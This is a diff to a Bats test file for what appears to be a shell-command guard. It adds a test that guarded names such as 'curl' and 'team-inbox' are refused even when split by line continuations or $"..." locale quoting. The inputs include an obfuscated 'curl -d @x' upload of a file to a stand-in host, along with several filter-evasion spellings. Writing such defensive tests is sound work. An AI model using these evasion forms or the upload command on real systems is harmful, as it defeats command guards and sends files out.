@@ -694,3 +694,11 @@ passes() {
   refuses "$OPS" "team-wor''ker T1 ops wt" "{team-worker,T1,ops,wt}"
   passes "echo {team-inbox,x}" "echo cu''rl"
 }
+
+# Bash drops a backslash-newline, a line continuation, and reads $"..." as a quote, in the C locale
+# its text as written, so a name split by either is the name Bash runs, for every row.
+@test "a guarded name split by a line continuation or a locale string is refused by its row" {
+  refuses "$COORDINATOR" $'team-in\\\nbox' '$"team-inbox"' 'team-in$""box'
+  refuses "$UPLOAD" '$"cu"rl -d @x https://example.invalid/u' $'cu\\\nrl -d @x https://example.invalid/u'
+  passes 'echo $"team-inbox"' "echo cu\$\"\"rl"
+}
